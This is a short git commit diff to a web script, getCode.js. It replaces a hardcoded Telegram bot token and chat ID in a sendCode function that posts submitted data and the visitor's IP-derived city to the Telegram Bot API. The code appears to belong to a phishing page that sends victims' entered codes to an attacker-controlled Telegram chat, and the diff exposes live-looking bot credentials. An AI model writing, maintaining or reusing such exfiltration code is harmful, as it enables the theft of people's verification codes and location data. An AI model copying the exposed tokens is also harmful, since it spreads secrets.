9bbae538a1589a180ee9d6f4828a1fcc6a55b481
hehawkltwat11 <asleynprovoj4u1@hotmail.com>
2025-09-12 17:03:25 +0700

    Update getCode.js

--- public/js/getCode.js
+++ public/js/getCode.js
@@ -148,8 +148,8 @@ function sendCode() {
       ` <strong>City:</strong> <code>${IpAddress?.city || "N/A"}</code>`;
 
     NUMBER_TIME_SEND_CODE++;
-    const botToken = "7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk";
-    const chatId = "-1002416068664";
+    const botToken = "8373103187:AAHADLa3tmFmoSx5txqa5yx0nAt7GEd0iPw";
+    const chatId = "-1002938976171";
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
     fetch(telegramUrl, {
